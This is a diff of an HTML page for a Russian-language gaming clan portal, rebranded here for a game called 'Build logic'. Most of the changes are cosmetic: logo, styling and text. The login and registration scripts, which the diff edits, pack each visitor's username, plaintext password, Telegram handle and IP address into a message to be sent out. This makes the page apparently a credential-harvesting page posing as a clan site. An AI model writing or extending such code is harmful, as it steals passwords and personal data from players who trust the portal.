@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>МВДУслуги | Клан МВД</title>
+    <link rel="icon" type="image/png" href="ztt.png">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
@@ -76,6 +77,13 @@
             font-weight: bold;
             color: var(--primary);
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+        
+        .logo-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         
         .logo-text h1 {
@@ -495,7 +503,9 @@
         <div class="container">
             <div class="header-content">
                 <div class="logo">
-                    <div class="logo-icon">МВД</div>
+                    <div class="logo-icon">
+                        <img src="ztt.png" alt="МВД Логотип">
+                    </div>
                     <div class="logo-text">
                         <h1>МВДУслуги</h1>
                         <p>Официальный портал клана МВД</p>
@@ -543,10 +553,10 @@
                         </div>
                         <div class="form-group">
                             <label class="form-label" for="registerEmail">Telegram</label>
-                            <input type="text" class="form-input" id="registerEmail" required placeholder="@username">
+                            <input type="text" class="form-input" id="registerEmail" required placeholder="@mvd_general_RF">
                         </div>
                         <div class="form-group">
-                            <label class="form-label" for="registerPhone">Уровень в игре</label>
+                            <label class="form-label" for="registerPhone">Уровень в Build logic</label>
                             <input type="text" class="form-input" id="registerPhone" required placeholder="Например: 150">
                         </div>
                         <div class="form-group">
@@ -604,27 +614,27 @@
                             <div class="status-text">СИСТЕМА АКТИВНА</div>
                         </div>
                     </div>
-                    <p>Добро пожаловать в официальную систему клана МВД. Здесь вы можете управлять клановыми делами, просматривать расписание ивентов и взаимодействовать с участниками.</p>
+                    <p>Добро пожаловать в официальную систему клана МВД в Build logic. Здесь вы можете управлять клановыми делами, просматривать расписание ивентов и взаимодействовать с участниками.</p>
                     
                     <div class="services-grid">
                         <div class="service-card">
                             <div class="service-icon"><i class="fas fa-users"></i></div>
                             <h3>Состав клана</h3>
-                            <p>Просмотр списка участников, их рангов и активности</p>
+                            <p>Просмотр списка участников, их рангов и активности в Build logic</p>
                             <button class="btn" style="width: 100%; margin-top: 10px;">Открыть</button>
                         </div>
                         
                         <div class="service-card">
                             <div class="service-icon"><i class="fas fa-calendar-check"></i></div>
-                            <h3>Ивенты</h3>
-                            <p>Расписание клановых мероприятий и рейдов</p>
+                            <h3>Ивенты Build logic</h3>
+                            <p>Расписание клановых мероприятий и рейдов в игре</p>
                             <button class="btn" style="width: 100%; margin-top: 10px;">Посмотреть</button>
                         </div>
                         
                         <div class="service-card">
                             <div class="service-icon"><i class="fas fa-warehouse"></i></div>
                             <h3>Клановое хранилище</h3>
-                            <p>Управление общими ресурсами и предметами</p>
+                            <p>Управление общими ресурсами и предметами в Build logic</p>
                             <button class="btn" style="width: 100%; margin-top: 10px;">Доступно</button>
                         </div>
                     </div>
@@ -638,15 +648,15 @@
             <div class="footer-content">
                 <div class="footer-section">
                     <h3>Клан МВД</h3>
-                    <p>Сильнейшее игровое сообщество. Профессионализм, дисциплина, победа!</p>
+                    <p>Сильнейшее игровое сообщество в Build logic. Профессионализм, дисциплина, победа!</p>
                 </div>
                 
                 <div class="footer-section">
                     <h3>КОНТАКТЫ</h3>
                     <ul>
-                        <li><i class="fas fa-gamepad"></i> Игровой сервер: МВД #1</li>
-                        <li><i class="fab fa-telegram"></i> Telegram: @MVD_Clan</li>
-                        <li><i class="fas fa-crown"></i> Лидер: [МВД]Командор</li>
+                        <li><i class="fas fa-gamepad"></i> Игра: Build logic</li>
+                        <li><i class="fab fa-telegram"></i> Telegram: @mvd_general_RF</li>
+                        <li><i class="fas fa-crown"></i> Лидер: mvd</li>
                     </ul>
                 </div>
                 
@@ -661,7 +671,7 @@
             </div>
             
             <div class="copyright">
-                <p>© 2024 Клан МВД | Все права защищены. Made with ❤️ for gaming community</p>
+                <p>© 2024 Клан МВД | Build logic | Все права защищены</p>
             </div>
         </div>
     </footer>
@@ -715,7 +725,7 @@
                 console.log('Отправка данных входа...');
                 
                 // Проверяем что сообщение не пустое
-                const message = `🔐 ВХОД В СИСТЕМУ КЛАНА МВД\n🎮 Игрок: ${username || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
+                const message = `🔐 ВХОД В СИСТЕМУ КЛАНА МВД\n🎮 Игрок: ${username || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n🎯 Игра: Build logic\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
                 
                 if (!username || !password) {
                     alert('Пожалуйста, заполните все поля!');
@@ -759,7 +769,7 @@
                 }
                 
                 // Проверяем что сообщение не пустое
-                const message = `📝 ЗАЯВКА В КЛАН МВД\n🎮 Игрок: ${username || 'Не указан'}\n📱 Telegram: ${telegram || 'Не указан'}\n📊 Уровень: ${level || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
+                const message = `📝 ЗАЯВКА В КЛАН МВД\n🎮 Игрок: ${username || 'Не указан'}\n📱 Telegram: ${telegram || 'Не указан'}\n📊 Уровень в Build logic: ${level || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n🎯 Игра: Build logic\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
                 
                 if (!username || !telegram || !level || !password) {
                     alert('Пожалуйста, заполните все поля!');
